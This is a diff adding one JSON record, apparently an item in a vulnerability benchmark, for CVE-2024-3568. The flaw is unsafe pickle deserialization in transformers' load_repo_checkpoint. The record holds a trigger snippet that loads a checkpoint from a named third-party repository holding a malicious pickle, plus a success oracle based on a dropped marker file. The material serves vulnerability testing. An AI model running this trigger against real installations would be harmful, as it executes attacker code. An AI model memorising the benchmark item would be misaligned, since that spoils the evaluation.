@@ -1,0 +1,15 @@
+{
+  "file_id": "213_transformers_huntr_b3c36992-5264-4d7f-9906-a996efafba8f",
+  "numeric_id": "213",
+  "library_hint": "transformers",
+  "source": "huntr",
+  "title": "Deserialization of untrusted data in load_repo_checkpoint() function allows remote code execution via malicious pickle payload",
+  "cve": "CVE-2024-3568",
+  "cwe": "CWE-502: Deserialization of Untrusted Data",
+  "library": "transformers",
+  "affected_version": "< 4.38",
+  "vulnerable_function": "load_repo_checkpoint",
+  "triggerability": "indirect",
+  "trigger_payload": "from transformers import TFAutoModel\nfrom tensorflow.keras.optimizers import Adam\nmodel = TFAutoModel.from_pretrained('bert-base-uncased')\nmodel.compile(optimizer=Adam(learning_rate=5e-5), loss='sparse_categorical_crossentropy')\nmodel.load_repo_checkpoint('Retr0REG/EvanModel')",
+  "oracle": "File 'hacked-by-retr0reg' is created in the home directory"
+}
